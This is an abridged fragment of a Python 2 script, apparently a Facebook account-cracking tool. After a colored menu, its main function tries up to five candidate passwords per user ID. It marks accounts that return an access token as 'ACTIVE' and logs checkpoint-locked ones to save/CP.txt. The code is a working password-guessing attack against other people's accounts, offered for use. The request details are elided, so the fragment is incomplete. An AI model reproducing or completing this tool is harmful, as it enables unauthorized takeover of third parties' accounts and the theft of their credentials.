...
def menu():
    ...
    print
    jalan('\x1b[1;91m[\x1b[1;93m2\x1b[1;91m] \x1b[1;92mUPDATE \x1b[1;91m[\x1b[1;93m3\x1b[1;91m] \x1b[1;92mYOUTUBE \x1b[1;91m[\x1b[1;93m4\x1b[1;91m] \x1b[1;92mCONTACT FB\x1b[1;91m[\x1b[1;93m\x1b[1;91m] \x1b[1;92mEXIT')
    action()
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;93m(ACTIVE)  ' + k + c + user + '    ' + pass1                                       
                ...
                if 'www.facebook.com' in q['error_msg']:
                    print '\033[1;97m(Offline) ' + k + c + user + '    ' + pass1
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;93m(ACTIVE)  ' + k + c + user +  '    ' + pass2
                        okb = open('save/CP.txt', 'a')
                        ...
                        if 'www.facebook.com' in q['error_msg']:
                            print '\033[1;97m(Offline) ' + k + c + user + '    ' + pass2
                            cps = open('save/CP.txt', 'a')
                            ...
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;93m(Active)  ' + k + c + user + '    ' + pass3
                                okb = open('save/CP.txt', 'a')
                                ...
                                if 'www.facebook.com' in q['error_msg']:
                                    print '\033[1;97m(offline) ' + k + c + user + '    ' + pass3 
                                    cps = open('save/CP.txt', 'a')
                                    ...
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;93m(Active)  ' + k + c + user + '    ' + pass4
                                        okb = open('save/CP.txt', 'a')
                                        ...
                                        if 'www.facebook.com' in q['error_msg']:
                                            print '\033[1;97m(Offline) ' + k + c + user + '    ' + pass4
                                            cps = open('save/CP.txt', 'a')
                                            ...
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                print '\x1b[1;93m(Active)  ' + k + c + user + '    ' + pass5
                                                okb = open('save/CP.txt', 'a')
                                                ...
                                                if 'www.facebook.com' in q['error_msg']:
                                                    print '\033[1;97m(Offline) ' + k + c + user + '    ' + pass5 
                                                    cps = open('save/CP.txt', 'a')
